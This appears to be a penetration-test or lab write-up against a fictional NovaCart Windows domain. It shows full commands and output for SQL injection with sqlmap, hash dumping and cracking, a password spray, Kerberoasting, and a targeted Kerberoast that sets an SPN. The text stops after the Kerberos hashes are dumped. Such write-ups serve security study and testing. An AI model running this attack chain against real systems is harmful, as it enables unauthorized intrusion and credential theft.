
# Objective and scope
NovaCart is an e-commerce company that operates a webshop for PC accessories. However, the entire platform is still under active development and expansion.

The IT team is currently working on a Linux-based version of the webshop as well as the development of a mobile app for NovaCart. The team is focused on adding features quickly, and has not prioritized security.

We have been tasked with conducting a penetration test to thoroughly assess the environment, identify vulnerabilities, and evaluate the overall security of the system.

The client has provided you with VPN access to their internal network, but no credentials.

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT 10.0.18.23   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-01 17:12 +0100
Nmap scan report for 10.0.18.23
Host is up (0.096s latency).
Not shown: 65506 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5000/tcp  open  upnp
5985/tcp  open  wsman
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49704/tcp open  unknown
49711/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 34.83 seconds
```

## Nmap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5000,5985,8080,9389 -A --min-rate=2000 -sT 10.0.18.23
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-01 17:16 +0100
Nmap scan report for 10.0.18.23
Host is up (0.096s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: NovaCart | Premium PC Components & Gaming Systems
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-01 16:16:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: novacart.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: novacart.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.novacart.local
| Not valid before: 2025-12-24T22:48:49
|_Not valid after:  2026-06-25T22:48:49
| rdp-ntlm-info: 
|   Target_Name: NOVACART
|   NetBIOS_Domain_Name: NOVACART
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: novacart.local
|   DNS_Computer_Name: DC.novacart.local
|   DNS_Tree_Name: novacart.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-01T16:16:36+00:00
|_ssl-date: 2026-05-01T16:16:45+00:00; 0s from scanner time.
5000/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  NTLM
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
| http-ntlm-info: 
|   Target_Name: NOVACART
|   NetBIOS_Domain_Name: NOVACART
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: novacart.local
|   DNS_Computer_Name: DC.novacart.local
|   DNS_Tree_Name: novacart.local
|_  Product_Version: 10.0.17763
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http          Jetty 12.0.25
|_http-server-header: Jetty(12.0.25)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (93%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (93%), Microsoft Windows 10 1709 - 22H2 (92%), Microsoft Windows 10 1909 (90%), Microsoft Windows 10 1909 - 2004 (90%), Microsoft Windows 11 24H2 - 25H2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2016 (88%), Microsoft Windows 10 21H2 (87%), Microsoft Windows Server 2012 Data Center (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Three webservers running
- port 80
- port 5000
- port 8080

Winrm and RDP are also open

Nothing interesting in DNS

# HTTP (80)
## Nuclei
```python
nuclei -u http://novacart.local/

[iis-shortname-detect] [http] [info] http://novacart.local/*~1*/a.aspx
[iis-shortname-detect] [http] [info] http://novacart.local/tqqjrdw5*~1*/a.aspx
[iis-shortname-detect] [http] [info] http://novacart.local/*~1*/a.aspx
[waf-detect:aspgeneric] [http] [info] http://novacart.local/
[waf-detect:modsecurity] [http] [info] http://novacart.local/
[rdp-detect] [javascript] [info] novacart.local:3389
[ldap-metadata] [javascript] [info] novacart.local:389 ["DomainFunctionality: 7","ForestFunctionality: 7","DomainControllerFunctionality: 7","BaseDN: dc=389","DnsHostName: DC.novacart.local","DefaultNamingContext: DC=novacart,DC=local"]
[mysql-info] [javascript] [info] novacart.local:3306 ["Version:","Transport: tcp"]
[smb-version-detect:smb-version] [javascript] [info] novacart.local:445 ["SMB 2.1"]
[smb2-server-time] [javascript] [info] novacart.local:445 ["SystemTime: 2026-05-01T16:25:56.000Z ServerStartTime: 2009-04-22T19:24:48.000Z"]
[smb2-capabilities] [javascript] [info] novacart.local:445 ["["DFSSupport","LargeMTU","Leasing"]"]
[ldap-anonymous-login-detect] [javascript] [medium] novacart.local:389
[smb-enum-domains] [javascript] [info] novacart.local:445 ["DomainName: novacart.local"]
[smb-enum] [javascript] [info] novacart.local:445 ["NetBIOSComputerName: DC","NetBIOSDomainName: NOVACART","DNSComputerNamen: DC.novacart.local","DNSComputerName: DC.novacart.local","ForestName: novacart.local","OSVersion: 10.0.17763"]
[smb-os-detect] [javascript] [info] novacart.local:445 ["Windows Server 2019, Version 1809"]
[mysql-detect] [tcp] [info] novacart.local:3306
[rdp-detection:win2016] [tcp] [info] novacart.local:3389
[microsoft-iis-version] [http] [info] http://novacart.local/ ["Microsoft-IIS/10.0"]
[aspnet-version-detect] [http] [info] http://novacart.local/%3f ["4.0.30319"]
[missing-sri] [http] [info] http://novacart.local/ ["https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css","https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap"]
[addeventlistener-detect] [http] [info] http://novacart.local/
[email-extractor] [http] [info] http://novacart.local/ ["support@novacart.com"]
[old-copyright] [http] [info] http://novacart.local/ ["&copy; 2023"]
[http-missing-security-headers:strict-transport-security] [http] [info] http://novacart.local/
[http-missing-security-headers:content-security-policy] [http] [info] http://novacart.local/
[http-missing-security-headers:permissions-policy] [http] [info] http://novacart.local/
[http-missing-security-headers:x-content-type-options] [http] [info] http://novacart.local/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://novacart.local/
[http-missing-security-headers:referrer-policy] [http] [info] http://novacart.local/
[http-missing-security-headers:clear-site-data] [http] [info] http://novacart.local/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://novacart.local/
[http-missing-security-headers:x-frame-options] [http] [info] http://novacart.local/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://novacart.local/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://novacart.local/
[http-missing-security-headers:missing-content-type] [http] [info] http://novacart.local/
[options-method] [http] [info] http://novacart.local/ ["OPTIONS, TRACE, GET, HEAD, POST"]
[tech-detect:font-awesome] [http] [info] http://novacart.local/
[tech-detect:google-font-api] [http] [info] http://novacart.local/
[tech-detect:ms-iis] [http] [info] http://novacart.local/
[caa-fingerprint] [dns] [info] novacart.local
```

It looks like its identified mysql as being open!

```python
nmap -p 3306 -A dc.novacart.local                 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-01 17:28 +0100
Nmap scan report for dc.novacart.local (10.0.18.23)
Host is up (0.096s latency).
rDNS record for 10.0.18.23: DC.novacart.local

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL (unauthorized)
```
Nmap is telling me it is as well

There are no subdomains!

After running feroxbuster i did not find anything interesting

![1031](Pasted%20image%2020260501173754.png)

Whats interesting is there is a search function that is pulling from a file, could be vulnerable to some sort of local file inclusion

Doesnt appear to be vulnerable to SQLi

# SQLi leads to initial access

```python
sqlmap -u http://novacart.local/search.aspx?q=graphics --batch --flush-session --dbs --risk 3 --level 5

[17:47:27] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2019 or 2022 or 10 or 2016 or 11
web application technology: Microsoft IIS 10.0, ASP.NET, ASP.NET 4.0.30319
back-end DBMS: Microsoft SQL Server 2019

available databases [4]:
[*] model
[*] msdb
[*] NovaCart
[*] tempdb
```

Ill start by targeting the `NovaCart` DB

```python
sqlmap -u http://novacart.local/search.aspx?q=graphics --batch --flush-session --dbs --risk 3 --level 5 -D NovaCart --tables

Database: NovaCart
[3 tables]
+-----------------+
| payment_methods |
| products        |
| users           |
+-----------------+
```
Ill select the users table

```python
sqlmap -u http://novacart.local/search.aspx?q=graphics --batch --flush-session --dbs --risk 3 --level 5 -D NovaCart -T users --dump

Database: NovaCart
Table: users
[4 entries]
+----+------------+-----------------------------------------------------------------------+
| id | username   | password_hash                                                         |
+----+------------+-----------------------------------------------------------------------+
| 5  | j.paul     | 65a3657685b09db625ef25da7754d7d140e75c3640dc2482de87218ee8d85b2b:jb44 |
| 6  | m.ruehl    | 57eeb5788565564c9a3a0283eb615204534583a8fbd3ccae1637a04df12287b1:jb43 |
| 7  | d.barowski | bf9b834e082c88823b59d05446a819276a907114c928505b829ddbbad73d6d35:jb42 |
| 8  | d.winkler  | 66be630f32845c0d7b098b4d94f1ca424ae3e35266267078f7974248caf412ac:jb45 |
+----+------------+-----------------------------------------------------------------------+
```
Found some users and some password hashes

## Cracking hashes

```python
hashcat sqli-hashes.txt /usr/share/wordlists/rockyou.txt -m 1420

65a3657685b09db625ef25da7754d7d140e75c3640dc2482de87218ee8d85b2b:jb44:password123
bf9b834e082c88823b59d05446a819276a907114c928505b829ddbbad73d6d35:jb42:kubarow
```
So its cracked two hashes

```python
j.paul:password123
d.barowski:kubarow
```
I will now validate these credentials

```python
nxc smb dc.novacart.local -u 'j.paul' -p 'password123'                          
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\j.paul:password123

nxc smb dc.novacart.local -u 'd.barowski' -p 'kubarow'
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\d.barowski:kubarow
```
Both users are compromised here!

Both users have the same access on SMB 

# Access on SMB shares for `j.paul` and `d.barowski`
```python
nxc smb dc.novacart.local -u 'j.paul' -p 'password123' --shares
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\j.paul:password123 
SMB         10.0.18.23      445    DC               [*] Enumerated shares
SMB         10.0.18.23      445    DC               Share           Permissions     Remark
SMB         10.0.18.23      445    DC               -----           -----------     ------
SMB         10.0.18.23      445    DC               ADMIN$                          Remote Admin
SMB         10.0.18.23      445    DC               C$                              Default share
SMB         10.0.18.23      445    DC               IPC$            READ            Remote IPC
SMB         10.0.18.23      445    DC               NETLOGON        READ            Logon server share 
SMB         10.0.18.23      445    DC               Shares          READ            
SMB         10.0.18.23      445    DC               SYSVOL          READ            Logon server share
```

So i have read access on `Shares`

```python
nxc smb dc.novacart.local -u 'd.barowski' -p 'kubarow' --users-export users.txt
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\d.barowski:kubarow 
SMB         10.0.18.23      445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.0.18.23      445    DC               Administrator                 2026-02-28 11:04:32 0       Built-in account for administering the computer/domain 
SMB         10.0.18.23      445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.0.18.23      445    DC               krbtgt                        2025-12-22 18:11:25 0       Key Distribution Center Service Account 
SMB         10.0.18.23      445    DC               j.bronski                     2025-12-31 20:20:59 0        
SMB         10.0.18.23      445    DC               d.barowski                    2025-12-22 19:32:21 0        
SMB         10.0.18.23      445    DC               svc_jenkins                   2025-12-23 10:19:07 0        
SMB         10.0.18.23      445    DC               j.paul                        2025-12-23 15:25:20 0        
SMB         10.0.18.23      445    DC               m.ruehl                       2025-12-23 15:25:20 0        
SMB         10.0.18.23      445    DC               d.winkler                     2025-12-23 15:25:20 0        
SMB         10.0.18.23      445    DC               j.dillon                      2026-03-02 20:29:26 0        
SMB         10.0.18.23      445    DC               t.morris                      2025-12-24 18:18:33 0        
SMB         10.0.18.23      445    DC               l.harrow                      2025-12-24 11:59:06 0        
SMB         10.0.18.23      445    DC               l.forta                       2025-12-25 00:54:36 0        
SMB         10.0.18.23      445    DC               p.bruce                       2025-12-25 00:55:06 0        
SMB         10.0.18.23      445    DC               m.mignola                     2026-03-17 21:46:43 0        
SMB         10.0.18.23      445    DC               l.thompson                    2025-12-31 20:36:45 0        
SMB         10.0.18.23      445    DC               m.brown                       2026-03-08 18:03:23 0        
SMB         10.0.18.23      445    DC               m.ibabao                      2026-03-17 19:29:32 0        
SMB         10.0.18.23      445    DC               andrew.collins                2026-03-08 18:02:28 0        
SMB         10.0.18.23      445    DC               m.turner                      2026-03-09 16:43:36 0        
SMB         10.0.18.23      445    DC               d.parker                      2026-03-09 16:43:36 0        
SMB         10.0.18.23      445    DC               j.bennett                     2026-03-09 16:43:36 0        
SMB         10.0.18.23      445    DC               l.harrison                    2026-03-09 16:43:37 0        
SMB         10.0.18.23      445    DC               o.griffin                     2026-03-09 16:43:37 0        
SMB         10.0.18.23      445    DC               j.clark                       2026-03-17 18:09:07 0        
SMB         10.0.18.23      445    DC               m.hughes                      2026-03-17 18:10:39 0        
SMB         10.0.18.23      445    DC               d.james                       2026-03-14 08:19:42 0        
SMB         10.0.18.23      445    DC               m.miller                      2026-03-14 08:19:42 0        
SMB         10.0.18.23      445    DC               s.diaz                        2026-03-14 08:19:43 0        
SMB         10.0.18.23      445    DC               cliff.b                       2026-03-17 16:32:38 0        
SMB         10.0.18.23      445    DC               [*] Enumerated 30 local users: NOVACART
SMB         10.0.18.23      445    DC               [*] Writing 30 local users to users.txt
```
Ill dump all the users here

Neither user has any access on WINRM or RDP
# Kerberoasting

Now i have valid credentials i can try kerberoasting

Also worth noting asrep roasting also failed

```python
nxc ldap dc.novacart.local -u j.paul -p 'password123' --kerberoasting kerb.hashes
LDAP        10.0.18.23      389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:novacart.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.18.23      389    DC               [+] novacart.local\j.paul:password123 
LDAP        10.0.18.23      389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.0.18.23      389    DC               [*] Total of records returned 1
LDAP        10.0.18.23      389    DC               [*] sAMAccountName: m.brown, memberOf: CN=Service Delegation Admins,CN=Users,DC=novacart,DC=local, pwdLastSet: 2026-03-08 18:03:23.807148, lastLogon: 2026-03-14 17:09:53.841255
LDAP        10.0.18.23      389    DC               $krb5tgs$23$*m.brown$NOVACART.LOCAL$novacart.local\m.brown*$b0a3c0d663e8bc139d8f2b1a6549c414$bc4e67ad85d6ef76fddf19cd55053c0d9270d568d95d84d1c72abc2486ba988c3859376f4cf41e56caf8ff29a984f85c943cf467f03194647f917b8e464a11ef2b5e2cfb9de0b30216cbc2cca7670aa561d48711ea486b0b65a27d18dd0765c9b8a43903c3afd9e75ebe3c0a09231ff616be74a57daeb08b31f2faafca653aac30b0ceb58fd26fabb27aa9a0fbabf724f27526f51e99143162061b0fa1c0f0d8b0247d2a18d27e803ce5726a76c6abe6868e46da51033e77ce4491d1e9b140618932f8db92c02f34cbd608c6d717ceb605a4543a75722eb7ed4f304fe7a58ee5e7e8e5d1faea236a73ac169f2f90efec2c280a639bbd0e58b26d3cc3eba1181680a04b5237522511c81947efb240df3dd8c147cf2cce3926988b0b51c086a989fb82f750af3a532f61029d076842e6e1ad9c9e8381204470a1e9a9d3c6e348d6e06cb41dfec91d3751d7b9e15acbe8386413ad71b743285f51d98043ee3d8cb16ee3ff840e56a0a5cf98d9299c1d856c67b89865d7f08ca2ad31bd539bf64e293d2d0ec509cefef5d0084212082c0407333f14559a183f1ad22628e51958be74617fc453516be24f3af0d061114c110b9a04c7db1fb34f983e830681a52181f449d470a2d1e52fab5579ca09418d4fef10d3234776aa7b77b390c6ee15a3901f82e8898213ec1fd714730976db187fac1fa93491d064aab91e4dbdd162d7a3b2389306b8357578b842a97a45a23acd55602239d9b56e50e06657a2b460abdff2f929b14a2b6e5a578657086b9c81eb97c7f3c409ad3c428f0f4afcc266b8f0cef4dc39134476dd796b5d215f4acd734a9c7b477b5b30477886ee1ec3c4288f5cc198a24fb0c0c4e0bc1ea69bce4fb564a0bee5154aaa768e44d067e71318ccc82e74ccf2385e3edcc6e2defc92128a2b33e45b8964891e2b049c08bfe3798e7f45615a7271ce2e6cc9b1d279067f13202c04d1d6ca435fbfb9d32e3bb5dc9625a64665c54248a465cc9d78d96055b65fbd25cd05ab8d470f5deb2676841d8e919551725d5eeb7e382ec0e24d749e34cde427660630ac67bab858584eb9939f8847d63a00cb0acaca26c330d9dde9d691411c503d8a5ae231cdcb5f75843114b60f0120fa80695541184a31047034185bbd4ea9ea359b3a41c3cd2cc448fe3cd12ffde34210c1d59c85816beae1866c0f5e7a61a1441d5fb4fc29c8bb3d8e1205c79ebffefa453ff9f428658ac985455d43225843ff4c6e9a7592831d5e786a1aab31f6ee8abafd4f36f3753ee5f60f94ecf8c42e22b074a2559cf7f217849539287ed8cd9d7f3f51b6fc815d8af23e6a86bcb43c4bdbd8f21b52efe047adc3f5defcd6192695acbef9e82da424ed650af5036f486a23a936ecc1094f003792e5e4044aa79c787e51c933522b276a2e7c07a9706eed5610a47c1ac6fb9fdee88801c0c82029
```

Looks like ive got a hash

The hash does not crack

# Password spray

```python
nxc smb dc.novacart.local -u users.txt -p password123 --continue-on-success
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [-] novacart.local\Administrator:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\Guest:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\krbtgt:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\j.bronski:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\d.barowski:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\svc_jenkins:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [+] novacart.local\j.paul:password123 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.ruehl:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\d.winkler:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\j.dillon:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\t.morris:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\l.harrow:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\l.forta:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\p.bruce:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.mignola:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\l.thompson:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.brown:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.ibabao:password123 STATUS_ACCOUNT_RESTRICTION 
SMB         10.0.18.23      445    DC               [-] novacart.local\andrew.collins:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.turner:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\d.parker:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\j.bennett:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\l.harrison:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\o.griffin:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\j.clark:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.hughes:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\d.james:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.miller:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\s.diaz:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\cliff.b:password123 STATUS_LOGON_FAILURE
```
So there is one user who is giving the error `STATUS_ACCOUNT_RESTRICTION` 

This is for the user `m.ibabao`

I am thinking this user is part of the protected users group but after trying kerberos auth on that user using both passwords it still fails so my verdict is the user is in protected users i just dont have the password yet

# Bloodhound

![](Pasted%20image%2020260501185637.png)

As the user `d.barowski` has GenericWrite over 4 users, one of them being another compromised user so ill ignore that!

The user `j.bronski` is a member of the webapp operators group this could give me access to the webserver running on port 5000 

Ill try a targeted kerberoast attack first and see if that works

# Targeted kerberoast leads to user compromise

```python
bloodyAD --host dc.novacart.local -d novacart.local -u 'd.barowski' -p 'kubarow' set object 'j.bronski' servicePrincipalName -v 'service/hacked'

[+] j.bronski's servicePrincipalName has been updated
```
Ill start by updating the SPN

```python
nxc ldap dc.novacart.local -u 'd.barowski' -p 'kubarow' --kerberoasting targ-kerb.hash             
LDAP        10.0.18.23      389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:novacart.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.18.23      389    DC               [+] novacart.local\d.barowski:kubarow 
LDAP        10.0.18.23      389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.0.18.23      389    DC               [*] Total of records returned 2
LDAP        10.0.18.23      389    DC               [*] sAMAccountName: m.brown, memberOf: CN=Service Delegation Admins,CN=Users,DC=novacart,DC=local, pwdLastSet: 2026-03-08 18:03:23.807148, lastLogon: 2026-03-14 17:09:53.841255
LDAP        10.0.18.23      389    DC               $krb5tgs$23$*m.brown$NOVACART.LOCAL$novacart.local\m.brown*$02819b5ecb4a3b25d2fe6920676f5e49$fa97f61f27f98f05e59b67b584c61bab405e7c762766c49cbae019c39a752fe07fc2291b585687f67dd8c19eca27effc1b2985a017c8c60dd350084a1da2926c1585cbf3152079172168d45d97ee12500555a9ca50b3570f151d505fe61356bbc1fe9d9799fafe53e0913afaa1f5416dea8b20c05268df5a0cd0c4cd1529b26bff698895eb579d17109383def266536e70d1f6d8841e2522a4c460ebef592809ef65f327241f673fe78636f1524c60b3cc22900ce3f38d2a1e0d7d01b30b70d590fc2d514e04780e5e6db197fc1dcb688b7e21b1a7fc5c26ec0af9628cb7134f93c25c16f002afeb310af623a6690bb2c651354b08ac475d1a284a10523e6aa02bb5a3c14b0303fef19920c1b3d55921190f27b9177d3585ffc839bc39c1c0297f341af6a747733002c128d05a7badfb5c853d386353829b030bbace4d837db07ba9c0e7ea11bfff0be4b1f2f0570f386b4471c22c5e95b595ab1f34f4b9e2734ece5bfa14e47a3e344ff30ba36bb7da9dba2299779bda12c37b8dcad52edcf51fb2e4b008ad8e74428087af3b4e4a0bb14aa7b893b9fd94ed6bcefda5b042883fd3173a7a515c01851eebd8294e07021622f0d3bd78132d59bec7d6a337a374ceef505e0b2d0942b72ffbd7154a597c1a1353f4ead66edc9466e732a68f11d49c3de64cb8314d735688146b04b6d5456bd6e5603b506a3f3d754269672ff1cace5edaf60fb4910b356ec623fe0a7a03f101bd309ce773117a62d71615b547b5667a42878e4563263b8b673acb3720ea572c9ea68a054d97d55b0ed84b3f35ede07d33717d72ab795454c06950aeaf5fdbc38997b4aaf8b318d5714c8a52e81533f72f63b6e55c2bba2faa8db65e72aa7464fb676586aeeba06c79a211e9fc3343679848177ba57eb7370e9cb731bb93f5fe8137d47b7d8d0903ba43f60900af67e0879ab6caf8ac0988fdff52ef62405739f4776456bca889be376c9abe99758d2ebdd86fbf815accb462972a3b2316c3bec94397146da7b7b9089464ea9f1229876b13d8130f5742c0f5895f7cfbfa44bce29b36a37358047a8c778768c404768220883b3928ea1da5e0b2d256268705aaf1f44218424da35bf9fcb1c980775682f754fb1b3232b4b4548b368ee76538e2b6df15bed63830921fd098aea0fe939bbe36579bf11efc17c7e7d980c0c1df68a48b14d34a3c22372c488e5abeed2bcfa5d8ba5116c414ecc8b9e8ea5ad03a63599650d86d4fb872a02c02304f38bd86a1f876a85da8e8c199ba4d94038c5f632bbc2559cbbeae421d6d412954191d28b93d811f134bc35db0a622c49920d393d0d82a4f4b02e47c464c65f80fd8ae41f1f93371b658ede4aa7d95fb14cb344dd0a86d5f6521dc9b0dbc6a68a6b41d8986d64ba402b161d3c87b2c816a426e99f84c453b03ba78818b3569bb606c54e5e4f54e6edc13220ec6953d7de6f1bd573cabbdccf10aed7575e7aba9a3010f003f0886ff4427f931ecfd23fb9a799dcbc2af6cf0b94d47d93cfd8e4d3735b07e934d06db978c4b864a8bd4f139cdc3
LDAP        10.0.18.23      389    DC               [*] sAMAccountName: j.bronski, memberOf: CN=WebApp_Operators,CN=Users,DC=novacart,DC=local, pwdLastSet: 2025-12-31 20:20:59.248817, lastLogon: 2025-12-31 20:31:58.061084
LDAP        10.0.18.23      389    DC               $krb5tgs$23$*j.bronski$NOVACART.LOCAL$novacart.local\j.bronski*$1ac18c311b2486378fce21bc341fc30f$91d68a323d4a0c29f1c34b28997221b1c1ebe485b295b0b68c9a21af7c7fd8ee4d6846a856653376565bca9b29e95cb5af5f864fc5049591e622fd7bb43b6b44db444df02765622220bd02f5afdfeee7a7288253d06264efa658d04ee9b84d6b3848b99919d92182a0803c4797fbe1123e01394eb1a6346b2a9e2a0a3abb3c5d7d4ab9cd8eb3f53ea68fa4122b5474ba50dca3b487ecdc6c9ba015c69f1254b0eeaa01c4e03ba82fffe8418ec15fee7948d0bcc8d29c9ece2eedf0426570de84c0725aab61285aac8f08fc9a0febcef80af717c1155487041bf27829f13357c678ef3d1399225afa8352c1eca3a6a29aae0e6490df59f60075add05e091058968cc96ea164837de0ad1d9d6526ab1bde82948ff99308d320a05840d32e9a9436ae59ff39d72683c177a9bc78168a619b97d148acd8761e21a3186366adfaabcaf05bf7f92414108f7c87aecbcd0045acb3e22007a693b347cd64de620f10d16d1870231e1102457cd40af1e48761bbab4c4175ac96e9ef055e854a708a864233d2ddc50ede00b4e834004d1aff32a736731fe24cc4a822d7de6df01536bba700fd432ac211659c12fa7dc0d74c1ee0bcc0cf8a9271e299c95148f8d740d9f6bbff0e6a84486507af2aa05ad50ade3193aa1841ee4fbaa37c965ec36ded19296f8bf3ac56fc0c6341f1efe5295e6d85cfa58f69c4f20e4c3b3a0fcd551a61bfacb5eb76f0272463e0232e65ba10f1ed21d98b3816022344c2a159271fed8d51e500f4de058b8c56821d2b926d9cdd3f91e349e1b4c8fe92f62452d07488f42a9234b148eca4a53699ed0f16ec1544785063f113f997e49a40a4f81d8658e13143b6493a79692c9f44247443d8d7c3a5b0dc43951019a1cc1d527f8a2ba61d7c4a2b81044b1516aca9d193bc714ea1333ef2a5103136bb6733f30d02ab1058061bbe5f4b8aad205bb85487e9f2d843ea3ead0aa4aca49217365d2b7705470347bd82c300f79f55af9943d102622a26ca7ec1bb9cdf49bffa2301255c1e11981282d67ff61cc20381e8da8b9b1b0be6dcf9da21eb38cbda8bdee3947b996c81f8e9be2e4e4ae6a70661c13bb2bde830c80a30567c8c519698f5ac6ff8a391a19574b58c78a693f